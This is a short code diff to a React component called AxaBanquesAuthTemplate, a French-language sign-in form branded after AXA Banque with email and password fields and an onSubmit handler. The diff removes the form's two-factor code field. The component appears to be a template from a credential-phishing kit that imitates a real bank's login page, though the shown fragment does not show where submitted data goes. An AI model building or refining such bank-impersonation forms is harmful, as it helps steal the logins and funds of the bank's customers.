@@ -8,8 +8,7 @@ interface AxaBanquesAuthTemplateProps {
 export function AxaBanquesAuthTemplate({ onSubmit }: AxaBanquesAuthTemplateProps) {
   const [formData, setFormData] = useState({
     email: '',
-    password: '',
-    twoFactorCode: ''
+    password: ''
   });
   const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
   const [showLoader, setShowLoader] = useState(false);
@@ -117,22 +116,6 @@ export function AxaBanquesAuthTemplate({ onSubmit }: AxaBanquesAuthTemplateProps
                     {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                   </button>
                 </div>
-              </div>
-
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Code d'authentification double
-                </label>
-                <input
-                  type="text"
-                  name="twoFactorCode"
-                  value={formData.twoFactorCode}
-                  onChange={handleChange}
-                  placeholder="Entrez le code reçu"
-                  maxLength="6"
-                  required
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-                />
               </div>
 
               <button
